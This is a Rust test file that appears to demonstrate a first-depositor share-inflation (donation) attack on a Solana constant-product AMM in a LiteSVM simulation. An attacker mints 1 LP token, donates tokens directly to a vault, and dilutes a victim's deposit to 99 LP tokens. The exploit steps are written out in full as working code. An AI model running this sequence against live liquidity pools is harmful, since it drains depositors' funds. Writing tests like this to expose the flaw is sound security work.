use solana_program_pack::Pack;
use anchor_lang::solana_program::sysvar::SysvarId;
use anchor_lang::{InstructionData, ToAccountMetas};
use anchor_lang::solana_program::{instruction::Instruction, pubkey::Pubkey, system_instruction, system_program};
use anchor_spl::token::spl_token;
use litesvm::LiteSVM;
use solana_message::{Message, VersionedMessage};
use solana_signer::Signer;
use solana_keypair::Keypair;
use solana_transaction::versioned::VersionedTransaction;
use constant_product_amm::math::withdraw_amount;

fn create_mint(svm: &mut LiteSVM, payer: &Keypair, mint_kp: &Keypair, decimals: u8) {
    let rent_lamports = anchor_lang::prelude::Rent::default().minimum_balance(spl_token::state::Mint::LEN);
    let ixs = vec![
        system_instruction::create_account(
            &payer.pubkey(),
            &mint_kp.pubkey(),
            rent_lamports,
            spl_token::state::Mint::LEN as u64,
            &spl_token::id(),
        ),
        spl_token::instruction::initialize_mint(&spl_token::id(), &mint_kp.pubkey(), &payer.pubkey(), None, decimals)
            .unwrap(),
    ];
    let blockhash = svm.latest_blockhash();
    let msg = Message::new_with_blockhash(&ixs, Some(&payer.pubkey()), &blockhash);
    let tx = VersionedTransaction::try_new(VersionedMessage::Legacy(msg), &[payer, mint_kp]).unwrap();
    svm.send_transaction(tx).unwrap();
}

fn create_token_account_with_balance(
    svm: &mut LiteSVM,
    payer: &Keypair,
    mint: &Pubkey,
    mint_authority: &Keypair,
    owner: &Pubkey,
    amount: u64,
) -> Keypair {
    let token_account_kp = Keypair::new();
    let rent_lamports = anchor_lang::prelude::Rent::default().minimum_balance(spl_token::state::Account::LEN);

    let mut ixs = vec![
        system_instruction::create_account(
            &payer.pubkey(),
            &token_account_kp.pubkey(),
            rent_lamports,
            spl_token::state::Account::LEN as u64,
            &spl_token::id(),
        ),
        spl_token::instruction::initialize_account(&spl_token::id(), &token_account_kp.pubkey(), mint, owner)
            .unwrap(),
    ];

    if amount > 0 {
        ixs.push(
            spl_token::instruction::mint_to(
                &spl_token::id(),
                mint,
                &token_account_kp.pubkey(),
                &mint_authority.pubkey(),
                &[],
                amount,
            )
            .unwrap(),
        );
    }

    let blockhash = svm.latest_blockhash();
    let msg = Message::new_with_blockhash(&ixs, Some(&payer.pubkey()), &blockhash);
    let needs_mint_authority_signature = amount > 0 && payer.pubkey() != mint_authority.pubkey();

    let signers: Vec<&Keypair> = if needs_mint_authority_signature {
        vec![payer, mint_authority, &token_account_kp]
    } else {
        vec![payer, &token_account_kp]
    };
    let tx = VersionedTransaction::try_new(VersionedMessage::Legacy(msg), &signers).unwrap();
    svm.send_transaction(tx).unwrap();

    token_account_kp
}

fn get_token_balance(svm: &LiteSVM, token_account: &Pubkey) -> u64 {
    let account = svm.get_account(token_account).unwrap();
    let parsed = spl_token::state::Account::unpack(&account.data).unwrap();
    parsed.amount
}

fn donate_directly_to_vault(svm: &mut LiteSVM, payer: &Keypair, from: &Keypair, vault: &Pubkey, amount: u64) {
    let ix = spl_token::instruction::transfer(
        &spl_token::id(),
        &from.pubkey(),
        vault,
        &payer.pubkey(),
        &[],
        amount,
    )
    .unwrap();
    let blockhash = svm.latest_blockhash();
    let msg = Message::new_with_blockhash(&[ix], Some(&payer.pubkey()), &blockhash);
    let tx = VersionedTransaction::try_new(VersionedMessage::Legacy(msg), &[payer]).unwrap();
    svm.send_transaction(tx).unwrap();
}

#[test]
fn test_first_depositor_inflation_then_donation_attack() {
    let program_id = constant_product_amm::id();
    let attacker = Keypair::new();
    let victim = Keypair::new();
    let mint_a_kp = Keypair::new();
    let mint_b_kp = Keypair::new();

    let mut svm = LiteSVM::new();
    let bytes = include_bytes!("../../../target/deploy/constant_product_amm.so");
    svm.add_program(program_id, bytes).unwrap();
    svm.airdrop(&attacker.pubkey(), 10_000_000_000).unwrap();
    svm.airdrop(&victim.pubkey(), 10_000_000_000).unwrap();

    create_mint(&mut svm, &attacker, &mint_a_kp, 6);
    create_mint(&mut svm, &attacker, &mint_b_kp, 6);

    let (mint_a, mint_b) = {
        let a = mint_a_kp.pubkey();
        let b = mint_b_kp.pubkey();
        if a < b { (a, b) } else { (b, a) }
    };

    let (pool, _) = Pubkey::find_program_address(&[b"pool", mint_a.as_ref(), mint_b.as_ref()], &program_id);
    let (pool_authority, _) = Pubkey::find_program_address(&[b"authority", pool.as_ref()], &program_id);
    let (vault_a, _) = Pubkey::find_program_address(&[b"vault_a", pool.as_ref()], &program_id);
    let (vault_b, _) = Pubkey::find_program_address(&[b"vault_b", pool.as_ref()], &program_id);
    let (lp_mint, _) = Pubkey::find_program_address(&[b"lp_mint", pool.as_ref()], &program_id);

    let init_accounts = constant_product_amm::accounts::InitPool {
        payer: attacker.pubkey(),
        token_a_mint: mint_a,
        token_b_mint: mint_b,
        pool,
        pool_authority,
        vault_a,
        vault_b,
        lp_mint,
        token_program: spl_token::id(),
        system_program: system_program::id(),
        rent: anchor_lang::prelude::Rent::id(),
    };
    let init_ix = Instruction::new_with_bytes(
        program_id,
        &constant_product_amm::instruction::InitPool { fee_bps: 30 }.data(),
        init_accounts.to_account_metas(None),
    );
    let blockhash = svm.latest_blockhash();
    let msg = Message::new_with_blockhash(&[init_ix], Some(&attacker.pubkey()), &blockhash);
    let tx = VersionedTransaction::try_new(VersionedMessage::Legacy(msg), &[&attacker]).unwrap();
    svm.send_transaction(tx).unwrap();

    let attacker_token_a = create_token_account_with_balance(&mut svm, &attacker, &mint_a, &attacker, &attacker.pubkey(), 10_000_000);
    let attacker_token_b = create_token_account_with_balance(&mut svm, &attacker, &mint_b, &attacker, &attacker.pubkey(), 10_000_000);
    let attacker_lp_token = create_token_account_with_balance(&mut svm, &attacker, &lp_mint, &attacker, &attacker.pubkey(), 0);

    let add_liq_accounts = constant_product_amm::accounts::AddLiquidity {
        user: attacker.pubkey(),
        pool,
        pool_authority,
        vault_a,
        vault_b,
        lp_mint,
        user_token_a: attacker_token_a.pubkey(),
        user_token_b: attacker_token_b.pubkey(),
        user_lp_token: attacker_lp_token.pubkey(),
        token_program: spl_token::id(),
    };
    let add_liq_ix = Instruction::new_with_bytes(
        program_id,
        &constant_product_amm::instruction::AddLiquidity { amount_a: 1, amount_b: 1, min_lp_out: 1 }.data(),
        add_liq_accounts.to_account_metas(None),
    );
    let blockhash = svm.latest_blockhash();
    let msg = Message::new_with_blockhash(&[add_liq_ix], Some(&attacker.pubkey()), &blockhash);
    let tx = VersionedTransaction::try_new(VersionedMessage::Legacy(msg), &[&attacker]).unwrap();
    svm.send_transaction(tx).unwrap();

    let attacker_lp_balance = get_token_balance(&svm, &attacker_lp_token.pubkey());
    println!("Attacker LP balance after tiny deposit: {}", attacker_lp_balance);
    assert_eq!(attacker_lp_balance, 1);


    donate_directly_to_vault(&mut svm, &attacker, &attacker_token_a, &vault_a, 1_000);

    let vault_a_after_donation = get_token_balance(&svm, &vault_a);
    let vault_b_after_donation = get_token_balance(&svm, &vault_b);
    let vault_a_balance = get_token_balance(&svm, &vault_a);
    let vault_b_balance = get_token_balance(&svm, &vault_b);
    println!("Vault A after donation: {}, Vault B: {}", vault_a_after_donation, vault_b_after_donation);
  

    let victim_token_a = create_token_account_with_balance(&mut svm, &victim, &mint_a, &attacker, &victim.pubkey(), 1_000_000);
    let victim_token_b = create_token_account_with_balance(&mut svm, &victim, &mint_b, &attacker, &victim.pubkey(), 1_000_000);
    let victim_lp_token = create_token_account_with_balance(&mut svm, &victim, &lp_mint, &attacker, &victim.pubkey(), 0);

    let victim_add_liq_accounts = constant_product_amm::accounts::AddLiquidity {
        user: victim.pubkey(),
        pool,
        pool_authority,
        vault_a,
        vault_b,
        lp_mint,
        user_token_a: victim_token_a.pubkey(),
        user_token_b: victim_token_b.pubkey(),
        user_lp_token: victim_lp_token.pubkey(),
        token_program: spl_token::id(),
    };
    let victim_add_liq_ix = Instruction::new_with_bytes(
        program_id,
        &constant_product_amm::instruction::AddLiquidity {
            amount_a: 100_000,
            amount_b: 100_000,
            min_lp_out: 0, 
        }
        .data(),
        victim_add_liq_accounts.to_account_metas(None),
    );
    let blockhash = svm.latest_blockhash();
    let msg = Message::new_with_blockhash(&[victim_add_liq_ix], Some(&victim.pubkey()), &blockhash);
    let tx = VersionedTransaction::try_new(VersionedMessage::Legacy(msg), &[&victim]).unwrap();
    let res = svm.send_transaction(tx);
    assert!(res.is_ok(), "victim deposit should succeed but was diluted: {:?}", res);

    let victim_lp_balance = get_token_balance(&svm, &victim_lp_token.pubkey());
    assert_eq!(victim_lp_balance, 99, "victim received {} LP instead of ~100,000", victim_lp_balance);

    let attacker_redeem_a = withdraw_amount(1, vault_a_balance, 1 + 99).unwrap();
    let attacker_redeem_b = withdraw_amount(1, vault_b_balance, 1 + 99).unwrap();
    println!("Attacker withdraws {} token A and {} token B with just 1 LP (deposited only 1:1)", attacker_redeem_a, attacker_redeem_b);
}